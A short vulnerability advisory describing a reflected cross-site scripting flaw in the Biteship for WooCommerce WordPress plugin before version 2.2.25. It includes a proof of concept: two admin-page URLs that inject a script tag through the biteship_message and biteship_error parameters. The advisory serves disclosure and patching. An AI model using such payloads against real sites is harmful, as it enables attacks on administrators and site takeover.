## WordPress Plugin Vulnerabilities

# Biteship for WooCommerce < 2.2.25 - Reflected Cross-Site Scripting

### Description

The plugin does not sanitise and escape the biteship\_error and biteship\_message parameters before outputting them back in the page, leading to a Reflected Cross-Site Scripting which could be used against high privilege users such as admin

### Proof of Concept

Make a logged in admin open one of the URLs below:
https://example.com/wp-admin/admin.php?page=wc-settings&biteship\_operation=1&biteship\_message=<script>alert(/XSS/)</script>
https://example.com/wp-admin/admin.php?page=wc-settings&biteship\_operation=1&biteship\_error=<script>alert(/XSS/)</script>
